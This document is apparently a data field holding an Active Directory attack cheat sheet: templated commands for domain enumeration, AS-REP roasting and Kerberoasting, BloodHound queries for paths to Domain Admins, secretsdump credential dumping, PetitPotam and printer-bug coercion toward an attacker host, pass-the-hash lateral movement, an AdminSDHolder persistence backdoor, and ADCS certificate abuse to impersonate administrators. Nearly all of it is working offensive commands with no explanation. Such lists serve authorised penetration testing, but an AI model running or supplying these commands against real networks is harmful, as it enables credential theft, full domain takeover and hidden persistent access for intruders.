commands.command:
nltest /dclist:{DOMAIN}
nltest /domain_trusts
nltest /dsgetdc:{DOMAIN}

dsquery * -filter "(objectClass=domain)" -attr *
dsquery server -domain {DOMAIN}
dsquery site

crackmapexec smb {DC_IP}/24
crackmapexec smb {DC_IP}/24 -u {USERNAME} -p {PASSWORD}
crackmapexec smb {DC_IP}/24 -u {USERNAME} -p {PASSWORD} --gen-relay-list relay_targets.txt

# All interesting ACLs, GUIDs resolved
Find-InterestingDomainAcl -ResolveGUIDs

# Dangerous rights held by NON-privileged principals only
Get-DomainObjectAcl -ResolveGUIDs | ? {
  $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl|WriteOwner|ForceChangePassword|AllExtendedRights" -and
  $_.IdentityReference -notmatch "BUILTIN|Domain Admins|Enterprise Admins|NT AUTHORITY"
}

# What can a SPECIFIC user/group do? (replace SID)
Get-DomainObjectAcl -Identity * -ResolveGUIDs | ? { $_.SecurityIdentifier -eq "{DOMAIN_SID}-1104" }

smbclient -L //{DC_IP}/ -N
smbclient -L //{DC_IP}/ -U {USERNAME}%{PASSWORD}
smbclient //{DC_IP}/SYSVOL -U {USERNAME}%{PASSWORD}

dig axfr {DOMAIN} @{DC_IP}
nslookup
server {DC_IP}
ls -d {DOMAIN}

# With user list (no password needed):
impacket-GetNPUsers {DOMAIN}/ -usersfile users.txt -no-pass -dc-ip {DC_IP}

# With credentials (finds ALL vulnerable accounts):
impacket-GetNPUsers {DOMAIN}/{USERNAME}:{PASSWORD} -dc-ip {DC_IP} -request -format hashcat

# No creds at all (anonymous LDAP):
impacket-GetNPUsers {DOMAIN}/ -no-pass -dc-ip {DC_IP}

# List SPNs only (no ticket request)
impacket-GetUserSPNs {DOMAIN}/{USERNAME}:{PASSWORD} -dc-ip {DC_IP}

# With NTLM hash
impacket-GetUserSPNs {DOMAIN}/{USERNAME} -hashes :{NTLM_HASH} -dc-ip {DC_IP}

# Target specific user's SPN
impacket-GetUserSPNs {DOMAIN}/{USERNAME}:{PASSWORD} -dc-ip {DC_IP} -request-user {TARGET_USER}

// Computers with unconstrained delegation (excluding DCs)
MATCH (c:Computer {unconstraineddelegation:true})
WHERE NOT c.name =~ "(?i).*dc.*"
RETURN c.name, c.operatingsystem

// Users with unconstrained delegation
MATCH (u:User {unconstraineddelegation:true})
RETURN u.name

// Constrained delegation (TrustedToAuth)
MATCH (n) WHERE n.allowedtodelegate IS NOT NULL AND n.allowedtodelegate <> []
RETURN n.name, n.allowedtodelegate, labels(n)

// List all owned nodes
MATCH (n {owned:true}) RETURN n.name, labels(n)

// Paths from owned nodes to DA
MATCH p=shortestPath((n {owned:true})-[*1..]->(g:Group))
WHERE g.name =~ "(?i)domain admins.*"
AND NOT n=g
RETURN p

// High value targets not yet owned
MATCH (n {highvalue:true, owned:false})
RETURN n.name, labels(n)

// Mark a node as owned (run in BH browser console)
// MATCH (u:User {name:"{USERNAME}@{DOMAIN}"}) SET u.owned=true RETURN u

// GenericAll on high-value objects
MATCH p=(u:User)-[:GenericAll]->(t)
WHERE t.highvalue=true
RETURN p

// WriteDACL on Domain
MATCH p=(u)-[:WriteDacl]->(d:Domain)
RETURN p

// Owned user -> ACL -> DA path
MATCH p=(u:User {owned:true})-[:GenericAll|WriteDacl|GenericWrite|WriteOwner|ForceChangePassword*1..]->(t)
RETURN p

// All dangerous ACLs from current user
MATCH p=(u:User {name:"{USERNAME}@{DOMAIN}"})-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner|ForceChangePassword|AddMember|AllExtendedRights]->(t)
RETURN p

impacket-secretsdump {DOMAIN}/{USERNAME}:{PASSWORD}@{TARGET_COMPUTER}
impacket-secretsdump {DOMAIN}/{USERNAME}:{PASSWORD}@{TARGET_COMPUTER} -just-dc
impacket-secretsdump {DOMAIN}/{USERNAME}:{PASSWORD}@{DC_IP} -just-dc-ntds

# Unauthenticated (older/unpatched):
python3 PetitPotam.py {ATTACKER_IP} {DC_IP}

# Authenticated:
python3 PetitPotam.py -u {USERNAME} -p {PASSWORD} -d {DOMAIN} {ATTACKER_IP} {DC_IP}

# netexec module:
netexec smb {DC_IP} -u {USERNAME} -p {PASSWORD} -M petitpotam

# Linux (impacket-based):
python3 printerbug.py {DOMAIN}/{USERNAME}:{PASSWORD}@{DC_IP} {ATTACKER_IP}

# Windows:
.\SpoolSample.exe {DC_IP} {ATTACKER_IP}

# Check if spooler is reachable:
rpcdump.py {DC_IP} | grep -i spool

mimikatz # token::elevate
mimikatz # token::list
mimikatz # token::impersonate /user:{TARGET_USER}

evil-winrm -i {TARGET_COMPUTER} -u {USERNAME} -p {PASSWORD}
evil-winrm -i {TARGET_COMPUTER} -u {USERNAME} -H {NTLM_HASH}
evil-winrm -i {TARGET_COMPUTER} -u {USERNAME} -p {PASSWORD} -s ./ -e ./  # Load PS scripts

impacket-psexec {DOMAIN}/{USERNAME}@{TARGET_COMPUTER} -hashes :{NTLM_HASH}
impacket-wmiexec {DOMAIN}/{USERNAME}@{TARGET_COMPUTER} -hashes :{NTLM_HASH}
impacket-smbexec {DOMAIN}/{USERNAME}@{TARGET_COMPUTER} -hashes :{NTLM_HASH}

# Find MSSQL SPNs
Get-DomainUser -SPN | ? { $_.serviceprincipalname -match "MSSQL" }

# Connect (Windows auth)
impacket-mssqlclient {DOMAIN}/{USERNAME}:{PASSWORD}@{TARGET_COMPUTER} -windows-auth

# Spray / check access across hosts
netexec mssql {DC_IP}/24 -u {USERNAME} -p {PASSWORD}

Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" -PrincipalIdentity {USERNAME} -Rights All -Verbose

# Verify:
Get-DomainObjectAcl -Identity "AdminSDHolder" -ResolveGUIDs | Where-Object {$_.IdentityReference -match {USERNAME}}

impacket-getTGT {DOMAIN}/{USERNAME}:{PASSWORD}
impacket-getTGT {DOMAIN}/{USERNAME} -hashes :{NTLM_HASH}
export KRB5CCNAME={USERNAME}.ccache

# Request a cert impersonating a DA via Subject Alternative Name
certipy req -u {USERNAME}@{DOMAIN} -p {PASSWORD} -dc-ip {DC_IP} \
  -ca {CA_NAME} -template {TEMPLATE} -upn administrator@{DOMAIN}

# Authenticate with the cert to retrieve NT hash + TGT
certipy auth -pfx administrator.pfx -dc-ip {DC_IP}

# 1. Start the relay targeting the CA web enrollment
certipy relay -ca {CA_HOST} -template DomainController

# 2. Coerce the DC to authenticate (PetitPotam / Coercer)
python3 PetitPotam.py -u {USERNAME} -p {PASSWORD} {ATTACKER_IP} {DC_IP}

# 3. Auth with the captured DC cert -> DCSync
certipy auth -pfx dc.pfx -dc-ip {DC_IP}

# Set victim UPN to target admin, request cert, then revert
certipy account update -u {USERNAME}@{DOMAIN} -p {PASSWORD} -user {VICTIM} -upn administrator
certipy req -u {VICTIM}@{DOMAIN} -p {PASSWORD} -ca {CA_NAME} -template {TEMPLATE}
certipy account update -u {USERNAME}@{DOMAIN} -p {PASSWORD} -user {VICTIM} -upn {VICTIM}@{DOMAIN}
certipy auth -pfx administrator.pfx -domain {DOMAIN}
